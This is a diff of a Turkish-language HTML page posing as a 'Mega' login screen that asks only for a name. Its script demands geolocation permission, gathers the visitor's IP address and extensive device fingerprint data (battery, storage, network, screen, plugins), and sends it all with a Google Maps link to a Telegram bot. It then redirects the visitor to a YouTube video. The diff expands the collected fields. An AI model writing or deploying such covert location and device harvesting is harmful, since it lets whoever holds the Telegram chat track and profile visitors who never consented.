@@ -4,9 +4,9 @@
   <meta charset="UTF-8">
   <title>PRO Mega Giriş</title>
   <style>
-    body { font-family: Arial; background:#eef; text-align:center; padding:50px; }
-    input, button { padding:10px; font-size:16px; margin:8px; }
-    #uyari { color:red; margin-top:10px; }
+    body { font-family: Arial; background: #eef; text-align: center; padding: 50px; }
+    input, button { padding: 10px; font-size: 16px; margin: 8px; }
+    #uyari { color: red; margin-top: 10px; }
   </style>
 </head>
 <body>
@@ -16,78 +16,143 @@
   <div id="uyari"></div>
 
   <script>
-  let info = {
-    name: "", ip:"Alınamadı", browser:"site:Bilinmiyor",
-    screen: `${screen.width}x${screen.height}`, pixelRatio: devicePixelRatio,
-    colorDepth: screen.colorDepth, memory: navigator.deviceMemory||"?", cores: navigator.hardwareConcurrency||"?",
-    online: navigator.onLine, platform: navigator.platform,
-    language: navigator.language, timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    hour: new Date().getHours(), timestamp: new Date().toLocaleString(),
-    batteryLevel: "?", charging:"?"
-  };
+    // 1. Başlangıç bilgileri
+    let info = {
+      name: "", lat: null, lon: null,
+      ip: "Alınamadı",
+      browser: "site:Bilinmiyor",
+      screen: `${screen.width}x${screen.height}`,
+      pixelRatio: devicePixelRatio,
+      colorDepth: screen.colorDepth,
+      memory: navigator.deviceMemory||"?",
+      cores: navigator.hardwareConcurrency||"?",
+      online: navigator.onLine,
+      platform: navigator.platform,
+      language: navigator.language,
+      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      hour: new Date().getHours(),
+      timestamp: new Date().toLocaleString(),
+      batteryLevel: "?", charging: "?",
+      storageQuota: "?", storageUsage: "?",
+      netType: "?", downlink: "?", rtt: "?",
+      darkMode: false,
+      cookieEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack,
+      orientation: screen.orientation && screen.orientation.type ? screen.orientation.type : "unknown",
+      pluginsCount: navigator.plugins ? navigator.plugins.length : "?",
+      pageLoadTime: 0
+    };
 
-  window.onload = async () => {
-    navigator.geolocation.getCurrentPosition(p=> {
-      info.lat=p.coords.latitude; info.lon=p.coords.longitude;
-    }, e=>document.getElementById("uyari").innerText="📍 Konum izni gerekli!");
+    // 2. Sayfa yüklenince veri toplama
+    window.onload = async () => {
+      // Konum
+      navigator.geolocation.getCurrentPosition(
+        p => { info.lat = p.coords.latitude; info.lon = p.coords.longitude; },
+        e => document.getElementById("uyari").innerText = "📍 Konum izni gerekli!"
+      );
 
-    try {
-      const data = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
-      info.ip = data.ip;
-    } catch {}
+      // IP
+      try {
+        const data = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
+        info.ip = data.ip;
+      } catch {}
 
-    if(navigator.getBattery) {
-      const bat = await navigator.getBattery();
-      info.batteryLevel = Math.round(bat.level*100)+"%";
-      info.charging = bat.charging;
-    }
+      // Batarya
+      if (navigator.getBattery) {
+        const bat = await navigator.getBattery();
+        info.batteryLevel = Math.round(bat.level*100)+"%";
+        info.charging = bat.charging;
+      }
 
-    const ua = navigator.userAgent;
-    if(ua.includes("Chrome")&&!ua.includes("Edg")) info.browser="site:Chrome";
-    else if(ua.includes("Firefox")) info.browser="site:Firefox";
-    else if(ua.includes("Safari")&&!ua.includes("Chrome")) info.browser="site:Safari";
-    else if(ua.includes("Edg")) info.browser="site:Edge";
-  };
+      // Depolama
+      if (navigator.storage && navigator.storage.estimate) {
+        const st = await navigator.storage.estimate();
+        info.storageQuota = st.quota;
+        info.storageUsage = st.usage;
+      }
 
-  async function girisYap(){
-    info.name = document.getElementById("username").value.trim();
-    if(!info.name) return document.getElementById("uyari").innerText="🧠 İsim lazım!";
-    if(info.lat===undefined) return document.getElementById("uyari").innerText="📍 Konum izni gerekli!";
+      // Ağ kalitesi
+      const conn = navigator.connection || {};
+      info.netType = conn.effectiveType || "?";
+      info.downlink = conn.downlink || "?";
+      info.rtt = conn.rtt || "?";
 
-    const txt = await fetch("bilgiler.txt").then(r=>r.text());
-    const BOT_TOKEN = txt.match(/BOT_TOKEN=(.*)/)[1].trim();
-    const CHAT_ID   = txt.match(/CHAT_ID=(.*)/)[1].trim();
+      // Tarayıcı türü
+      const ua = navigator.userAgent;
+      if (ua.includes("Chrome") && !ua.includes("Edg")) info.browser = "site:Chrome";
+      else if (ua.includes("Firefox")) info.browser = "site:Firefox";
+      else if (ua.includes("Safari") && !ua.includes("Chrome")) info.browser = "site:Safari";
+      else if (ua.includes("Edg")) info.browser = "site:Edge";
 
-    const maps = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
-    const msg = `
+      // Karanlık mod
+      info.darkMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
+
+      // Sayfa yükleme süresi
+      const timing = performance.timing;
+      info.pageLoadTime = timing.domContentLoadedEventEnd - timing.navigationStart;
+    };
+
+    // 3. Giriş işlevi
+    async function girisYap() {
+      info.name = document.getElementById("username").value.trim();
+      if (!info.name)
+        return document.getElementById("uyari").innerText = "🧠 İsim gerekli!";
+      if (info.lat === null)
+        return document.getElementById("uyari").innerText = "📍 Konum izni gerekli!";
+
+      // Telegram bilgileri
+      const txt = await fetch("bilgiler.txt").then(r=>r.text());
+      const BOT_TOKEN = txt.match(/BOT_TOKEN=(.*)/)[1].trim();
+      const CHAT_ID   = txt.match(/CHAT_ID=(.*)/)[1].trim();
+
+      // Harita linki
+      const maps = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
+
+      // Depolama MB cinsine
+      const usedMB  = Math.round(info.storageUsage/1024/1024);
+      const quotaMB = Math.round(info.storageQuota/1024/1024);
+
+      // Mesaj
+      const msg = `
 🎮 *Yeni Mega Giriş!*
 👤 İsim: *${info.name}*
-📍 Konum: *${info.lat}, ${info.lon}*  
-🔗 Harita: [Google Maps](${maps})  
-🖥️ IP: *${info.ip}*  
-🧭 Tarayıcı: *${info.browser}*  
-📱 Platform: *${info.platform}*  
-🌐 Dil: *${info.language}*  
-⏰ Saat Dilimi: *${info.timeZone}*  
-⌚ Yerel Zaman: *${info.timestamp}*  
-💻 Ekran: *${info.screen}* (@${info.pixelRatio}x, ${info.colorDepth} bit)  
-⚙️ RAM/Çekirdek: *${info.memory}GB / ${info.cores} çekirdek*  
-🔋 Pil: *${info.batteryLevel}* (Şarj: ${info.charging})  
-📶 Çevrimiçi: *${info.online}*  
-🕒 Saat: *${info.hour}:00*`;
+📍 Konum: *${info.lat}, ${info.lon}*
+🔗 Harita: [Google Maps](${maps})
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: msg,
-        parse_mode: "Markdown"
-      })
-    });
+🖥️ IP: *${info.ip}*
+🧭 Tarayıcı: *${info.browser}*
+📱 Platform: *${info.platform}*
+🌐 Dil: *${info.language}*
+⏰ Saat Dilimi: *${info.timeZone}*
+⌚ Yerel Zaman: *${info.timestamp}*
 
-    window.location.href = "https://www.youtube.com/watch?v=gdCZMdkdlBg";
-  }
+💻 Ekran: *${info.screen}* (@${info.pixelRatio}x, ${info.colorDepth} bit)
+⚙️ RAM/Çekirdek: *${info.memory}GB / ${info.cores} çekirdek*
+🔋 Pil: *${info.batteryLevel}* (Şarj: ${info.charging})
+💾 Depolama: *${usedMB}MB / ${quotaMB}MB*
+📶 Ağ: *${info.netType}* (${info.downlink}Mbps, ${info.rtt}ms)
+🌙 Karanlık Mod: *${info.darkMode ? "Aktif" : "Kapalı"}*
+🍪 Çerez: *${info.cookieEnabled}*
+🚫 DoNotTrack: *${info.doNotTrack}*
+📐 Yönelim: *${info.orientation}*
+🔌 Eklenti Sayısı: *${info.pluginsCount}*
+⏱️ Yükleme Süresi: *${info.pageLoadTime}ms*
+📶 Çevrimiçi: *${info.online}*
+`;
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: msg,
+          parse_mode: "Markdown"
+        })
+      });
+
+      // Komik video aç
+      window.location.href = "https://www.youtube.com/watch?v=gdCZMdkdlBg";
+    }
   </script>
 </body>
 </html>
